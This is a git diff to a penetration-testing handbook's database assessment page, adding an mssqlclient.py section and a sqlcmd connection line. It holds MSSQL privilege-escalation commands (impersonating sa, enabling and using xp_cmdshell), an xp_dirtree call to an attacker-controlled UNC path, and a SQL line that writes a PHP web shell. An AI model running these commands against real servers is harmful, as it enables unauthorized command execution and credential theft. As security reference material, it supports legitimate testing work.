@@ -9,6 +9,7 @@
 - [MongoDB](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MongoDB)
 - [MDB Tools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MDB-Tools)
 - [MSSQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MSSQL)
+- [mssqlclient.py](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#mssqlclient.py]
 - [MySQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MySQL)
 - [mysqldump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#mysqldump)
 - [NoSQL Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#NoSQL-Injection)
@@ -109,7 +110,7 @@ $ mdb-sql <FILE>
 ### Connection
 
 ```c
-$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 ```
 
 ### Show Database Content
@@ -142,6 +143,29 @@ $ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 
 ```c
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
+```
+
+## mssqlclient.py
+
+### Common Commands
+
+```c
+SQL> enum_logins
+SQL> enum_impersonate
+```
+
+### Connection
+
+```c
+$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+```
+
+### Privilege Escalation
+
+```c
+SQL> exec_as_login sa
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
 ```
 
 ## MySQL
@@ -518,6 +542,7 @@ SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FIL
 
 ```c
 $ sqlcmd -S <RHOST> -U <USERNAME>
+$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 ```
 
 ## SQL Injection
